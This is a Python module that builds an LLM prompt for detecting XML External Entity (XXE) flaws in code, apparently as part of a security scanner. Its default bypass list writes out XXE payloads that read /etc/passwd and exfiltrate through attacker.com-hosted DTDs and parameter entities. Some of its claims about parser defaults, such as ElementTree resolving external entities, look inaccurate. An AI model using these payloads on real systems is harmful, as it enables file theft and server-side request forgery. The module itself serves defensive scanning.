"""XXE (XML External Entity) analysis prompt.

Detects: XML parsing of untrusted input with insecure parser defaults.
"""

XXE_PROMPT_TEMPLATE = """You are analyzing a code path for **XML External Entity (XXE)** injection vulnerabilities.

Project Context
{readme_summary}

Code Path (analysis chain)
Format: [summary] = intent pseudocode, [DANGEROUS: pass_through] = raw source code.
```
{code_block}
```

{bypass_section}
Analysis Focus
----
The sink function on this path parses XML input. Determine if user-controlled XML data reaches the parser without secure configuration.

Checklist:
- [ ] Does user input directly reach an XML parser (ElementTree, lxml, minidom, SAX)?
- [ ] Are parser settings explicitly configured to disable DTD/entity resolution?
- [ ] For Python stdlib ``xml.etree.ElementTree``: DTD and entity resolution are enabled by default — is there any override?
- [ ] For ``lxml``: are ``resolve_entities``, ``no_network``, ``DTD`` properly configured?
- [ ] If ``BeautifulSoup`` with ``xml`` backend: Does it use ``lxml-xml`` parser? Is ``resolve_entities=False`` set?
- [ ] Is the XML source controllable by an attacker (HTTP request body, file upload, API parameter)?
- [ ] Can the parser be used for **file exfiltration** via external DTD entities?
- [ ] Can the parser be used for **SSRF** via external entity URLs?
- [ ] Is there a **Blind XXE** possibility (out-of-band via parameter entities)?
- [ ] Does the application return the parsed content to the attacker (error messages, rendered output)?

**Key parser defaults**:
- ``xml.etree.ElementTree.parse/fromstring``: DTD processing ON, entity resolution ON — **vulnerable by default**
- ``lxml.etree.parse/fromstring``: DTD ON by default, entity resolution ON by default
- ``xml.dom.minidom.parse/parseString``: DTD processing ON
- ``xml.sax.parse/parseString``: DTD processing ON
- ``lxml.objectify.fromstring/parse``: DTD ON by default, inherits lxml defaults
- ``BeautifulSoup(xml)``: defers to underlying parser (usually lxml) — depends on lxml config

Output JSON:
```json
{{
  "vulnerable": true/false,
  "vuln_type": "xxe",
  "sink_function": "fromstring/parse/XMLParser/...",
  "sink_file_line": "file.py:42",
  "confidence": 0-10,
  "analysis": "Explain whether the XML parser is exploitable and why.",
  "bypass_poc": "If vulnerable, describe exploit path, e.g. DOCTYPE + ENTITY payload"
}}
```
"""


def build_xxe_prompt(
    code_block: str = "",
    readme_summary: str = "",
    bypasses: str = "",
    **kwargs,
) -> str:
    bypass_section = bypasses if bypasses else (
        "Common XXE Bypass Techniques\n"
        "- DOCTYPE with internal entity: ``<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>``\n"
        "- Parameter entities for Blind XXE: ``<!ENTITY % xxe SYSTEM \"http://attacker.com/collect\">``\n"
        "- UTF-8 BOM injection: parser may skip BOM and process entity\n"
        "- XInclude: ``<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>``\n"
        "- Error-based XXE: trigger parser error that leaks file content\n"
        "- DTD external subset: ``<!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\">``\n"
        "- Base64-encoded entity: ``<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">``\n"
        "- Out-of-band (OOB): use parameter entity to exfiltrate to attacker-controlled server\n\n"
    )
    return XXE_PROMPT_TEMPLATE.format(
        code_block=code_block,
        readme_summary=readme_summary or "Not available.",
        bypass_section=bypass_section,
    )
